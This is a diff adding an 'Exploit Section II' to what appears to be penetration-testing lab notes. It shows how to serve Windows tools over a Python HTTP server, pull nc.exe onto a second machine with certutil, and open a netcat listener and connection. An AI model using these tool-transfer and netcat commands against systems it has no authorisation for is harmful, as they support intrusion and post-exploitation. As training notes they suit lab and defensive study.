@@ -2717,3 +2717,29 @@ chmod 0400 ssh_key
 ssh -i ssh_key root@demo.ine.local
 
 ```
+## Exploit Section II
+#### Python server
+**system 1**
+```
+cd /usr/share/windows-binaries
+python -m SimpleHTTPServer 80
+ifconfig
+```
+**Download file of system 1 in System 2**
+```
+certutil -urlcache -f http://<system 1 ip>/nc.exe nc.exe
+```
+
+#### Net cat
+**Listing on System 1**
+```
+nc -nvlp <port>
+nc -nvlp 1234
+```
+**Connection from system2**
+```
+nc -nv <System 1 ip> 1234
+nc -nv 10.10.31.2 1234
+
+```
+Type message it will reflect in system 1 and vice versa
